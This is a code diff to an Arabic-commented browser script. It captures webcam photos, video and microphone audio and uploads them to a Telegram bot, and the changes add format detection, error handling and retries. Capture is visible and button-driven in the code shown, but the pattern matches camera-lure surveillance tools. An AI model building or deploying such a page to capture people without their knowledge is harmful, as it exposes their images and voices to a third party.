@@ -17,6 +17,39 @@ document.addEventListener('DOMContentLoaded', () => {
     let stream = null;
     let mediaRecorder = null;
     let recordingType = ''; // 'video' or 'audio'
+    
+    // دالة للتحقق من صيغ الفيديو المدعومة
+    function getSupportedVideoMimeType() {
+        const types = [
+            'video/webm;codecs=vp9,opus',
+            'video/webm;codecs=vp8,opus',
+            'video/webm',
+            'video/mp4',
+            'video/x-msvideo'
+        ];
+        for (let type of types) {
+            if (MediaRecorder.isTypeSupported(type)) {
+                return type;
+            }
+        }
+        return 'video/webm'; // fallback
+    }
+    
+    // دالة للتحقق من صيغ الصوت المدعومة
+    function getSupportedAudioMimeType() {
+        const types = [
+            'audio/webm',
+            'audio/mp4',
+            'audio/mpeg',
+            'audio/wav'
+        ];
+        for (let type of types) {
+            if (MediaRecorder.isTypeSupported(type)) {
+                return type;
+            }
+        }
+        return 'audio/webm'; // fallback
+    }
 
     // طلب صلاحيات الوصول للكاميرا والميكروفون
     async function init() {
@@ -24,8 +57,31 @@ document.addEventListener('DOMContentLoaded', () => {
             updateStatus('خطأ: يرجى إدخال بيانات البوت في ملف script.js أولاً.', 'error');
             return;
         }
+        
+        // التحقق من دعم المتصفح للـ getUserMedia
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            updateStatus('خطأ: المتصفح لا يدعم الوصول للكاميرا والميكروفون.', 'error');
+            return;
+        }
+        
         try {
-            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            updateStatus('جاري طلب صلاحيات الوصول للكاميرا والميكروفون...', 'info');
+            
+            // محاولة الحصول على الكاميرا والميكروفون معاً
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: true 
+                });
+            } catch (err) {
+                // إذا فشل، حاول بدون تحديد facingMode
+                console.warn('محاولة بدون facingMode:', err);
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: true 
+                });
+            }
+            
             preview.srcObject = stream;
             preview.classList.remove('hidden');
             
@@ -36,7 +92,18 @@ document.addEventListener('DOMContentLoaded', () => {
             updateStatus('جاهز لالتقاط الوسائط', 'success');
         } catch (err) {
             console.error("خطأ في الوصول للوسائط:", err);
-            updateStatus('خطأ: لم يتم منح صلاحية الوصول للكاميرا والميكروفون.', 'error');
+            
+            // رسائل خطأ مفصلة بناءً على نوع الخطأ
+            let errorMessage = 'خطأ: لم يتم منح صلاحية الوصول للكاميرا والميكروفون.';
+            if (err.name === 'NotAllowedError') {
+                errorMessage = 'خطأ: تم رفض صلاحيات الوصول. يرجى السماح بالوصول للكاميرا والميكروفون.';
+            } else if (err.name === 'NotFoundError') {
+                errorMessage = 'خطأ: لم يتم العثور على كاميرا أو ميكروفون على هذا الجهاز.';
+            } else if (err.name === 'NotReadableError') {
+                errorMessage = 'خطأ: الكاميرا أو الميكروفون قيد الاستخدام من قبل تطبيق آخر.';
+            }
+            
+            updateStatus(errorMessage, 'error');
         }
     }
 
@@ -56,33 +123,54 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // دالة إرسال البيانات إلى تيليجرام
-    async function sendToTelegram(formData, caption = '') {
+    async function sendToTelegram(formData, caption = '', retries = 3) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/${formData.method}`;
         
-        const data = new FormData();
-        data.append('chat_id', CHAT_ID);
-        data.append(formData.fileType, formData.file, formData.fileName);
-        if (caption) {
-            data.append('caption', caption);
-        }
+        for (let attempt = 1; attempt <= retries; attempt++) {
+            try {
+                const data = new FormData();
+                data.append('chat_id', CHAT_ID);
+                data.append(formData.fileType, formData.file, formData.fileName);
+                if (caption) {
+                    data.append('caption', caption);
+                }
 
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                body: data
-            });
-            const result = await response.json();
-            if (result.ok) {
-                console.log('تم الإرسال بنجاح:', result);
-                return true;
-            } else {
-                console.error('فشل الإرسال:', result);
-                return false;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: data,
+                    timeout: 30000 // timeout بعد 30 ثانية
+                });
+                
+                if (!response.ok) {
+                    console.warn(`محاولة ${attempt}: حالة HTTP ${response.status}`);
+                    if (attempt < retries) {
+                        await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
+                        continue;
+                    }
+                }
+                
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('تم الإرسال بنجاح:', result);
+                    return true;
+                } else {
+                    console.error('فشل الإرسال:', result);
+                    if (attempt < retries) {
+                        await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
+                        continue;
+                    }
+                    return false;
+                }
+            } catch (error) {
+                console.error(`خطأ في المحاولة ${attempt}:`, error);
+                if (attempt < retries) {
+                    await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
+                } else {
+                    return false;
+                }
             }
-        } catch (error) {
-            console.error('خطأ في الشبكة:', error);
-            return false;
         }
+        return false;
     }
 
     // 1. التقاط الصور
@@ -104,26 +192,52 @@ document.addEventListener('DOMContentLoaded', () => {
                 return;
             }
             
-            const settings = videoTrack.getSettings();
-            canvas.width = settings.width;
-            canvas.height = settings.height;
+            // محاولة الحصول على إعدادات الفيديو
+            let width = 640;
+            let height = 480;
+            try {
+                const settings = videoTrack.getSettings();
+                if (settings.width && settings.height) {
+                    width = settings.width;
+                    height = settings.height;
+                }
+            } catch (err) {
+                console.warn('لم يتمكن من الحصول على إعدادات الفيديو، استخدام القيم الافتراضية:', err);
+            }
+            
+            canvas.width = width;
+            canvas.height = height;
             const context = canvas.getContext('2d');
 
             for (let i = 0; i < 5; i++) {
                 updateStatus(`التقاط الصورة ${i + 1} من 5...`, 'info');
-                context.drawImage(preview, 0, 0, canvas.width, canvas.height);
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
                 
-                const formData = {
-                    method: 'sendPhoto',
-                    fileType: 'photo',
-                    file: blob,
-                    fileName: `capture_${Date.now()}_${i}.jpg`
-                };
-                await sendToTelegram(formData, `صورة رقم ${i + 1}`);
-                
-                // انتظار قصير بين الصور
-                if (i < 4) await new Promise(resolve => setTimeout(resolve, 500));
+                try {
+                    context.drawImage(preview, 0, 0, canvas.width, canvas.height);
+                    const blob = await new Promise((resolve, reject) => {
+                        canvas.toBlob((blob) => {
+                            if (blob) {
+                                resolve(blob);
+                            } else {
+                                reject(new Error('فشل في تحويل الصورة إلى blob'));
+                            }
+                        }, 'image/jpeg', 0.95);
+                    });
+                    
+                    const formData = {
+                        method: 'sendPhoto',
+                        fileType: 'photo',
+                        file: blob,
+                        fileName: `capture_${Date.now()}_${i}.jpg`
+                    };
+                    await sendToTelegram(formData, `صورة رقم ${i + 1}`);
+                    
+                    // انتظار قصير بين الصور
+                    if (i < 4) await new Promise(resolve => setTimeout(resolve, 500));
+                } catch (photoError) {
+                    console.error(`خطأ في التقاط الصورة ${i + 1}:`, photoError);
+                    updateStatus(`خطأ في التقاط الصورة ${i + 1}: ${photoError.message}`, 'error');
+                }
             }
 
             updateStatus('تم التقاط وإرسال الصور بنجاح!', 'success');
@@ -137,11 +251,17 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // 2. تسجيل الفيديو
     recordVideoBtn.addEventListener('click', () => {
+        if (!stream) {
+            updateStatus('خطأ: لم يتم الحصول على بث الكاميرا.', 'error');
+            return;
+        }
+        
         if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
         } else {
             recordingType = 'video';
-            startRecording(stream, 'video/webm');
+            const videoMimeType = getSupportedVideoMimeType();
+            startRecording(stream, videoMimeType);
             recordVideoBtn.textContent = '🛑 إيقاف تسجيل الفيديو';
             recordVideoBtn.classList.add('btn-stop');
             recordAudioBtn.disabled = true;
@@ -152,12 +272,18 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // 3. تسجيل الصوت
     recordAudioBtn.addEventListener('click', () => {
+        if (!stream) {
+            updateStatus('خطأ: لم يتم الحصول على بث الميكروفون.', 'error');
+            return;
+        }
+        
         if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
         } else {
             recordingType = 'audio';
             const audioStream = new MediaStream(stream.getAudioTracks());
-            startRecording(audioStream, 'audio/webm');
+            const audioMimeType = getSupportedAudioMimeType();
+            startRecording(audioStream, audioMimeType);
             recordAudioBtn.textContent = '🛑 إيقاف تسجيل الصوت';
             recordAudioBtn.classList.add('btn-stop');
             recordVideoBtn.disabled = true;
@@ -169,7 +295,15 @@ document.addEventListener('DOMContentLoaded', () => {
     // دالة بدء التسجيل
     function startRecording(streamToRecord, mimeType) {
         let recordedChunks = [];
-        mediaRecorder = new MediaRecorder(streamToRecord, { mimeType });
+        
+        try {
+            mediaRecorder = new MediaRecorder(streamToRecord, { mimeType });
+        } catch (error) {
+            console.error('خطأ في إنشاء MediaRecorder:', error);
+            updateStatus('خطأ: المتصفح لا يدعم تسجيل الوسائط.', 'error');
+            resetButtons();
+            return;
+        }
 
         mediaRecorder.ondataavailable = (event) => {
             if (event.data.size > 0) {
@@ -177,9 +311,22 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         };
 
+        mediaRecorder.onerror = (event) => {
+            console.error('خطأ في التسجيل:', event.error);
+            updateStatus(`خطأ في التسجيل: ${event.error}`, 'error');
+            resetButtons();
+        };
+
         mediaRecorder.onstop = async () => {
             const blob = new Blob(recordedChunks, { type: mimeType });
             recordedChunks = [];
+
+            // تحديد امتداد الملف بناءً على نوع MIME
+            let fileExtension = 'webm';
+            if (mimeType.includes('mp4')) fileExtension = 'mp4';
+            else if (mimeType.includes('mpeg')) fileExtension = 'mp3';
+            else if (mimeType.includes('wav')) fileExtension = 'wav';
+            else if (mimeType.includes('x-msvideo')) fileExtension = 'avi';
 
             let formData;
             if (recordingType === 'video') {
@@ -187,7 +334,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     method: 'sendVideo',
                     fileType: 'video',
                     file: blob,
-                    fileName: `video_${Date.now()}.webm`
+                    fileName: `video_${Date.now()}.${fileExtension}`
                 };
                 updateStatus('جاري إرسال الفيديو...', 'info');
             } else { // audio
@@ -195,7 +342,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     method: 'sendAudio',
                     fileType: 'audio',
                     file: blob,
-                    fileName: `audio_${Date.now()}.webm`
+                    fileName: `audio_${Date.now()}.${fileExtension}`
                 };
                 updateStatus('جاري إرسال الصوت...', 'info');
             }
@@ -210,7 +357,13 @@ document.addEventListener('DOMContentLoaded', () => {
             resetButtons();
         };
 
-        mediaRecorder.start();
+        try {
+            mediaRecorder.start();
+        } catch (error) {
+            console.error('خطأ في بدء التسجيل:', error);
+            updateStatus('خطأ: لم يتمكن من بدء التسجيل.', 'error');
+            resetButtons();
+        }
     }
     
     // إعادة تعيين الأزرار إلى حالتها الأصلية
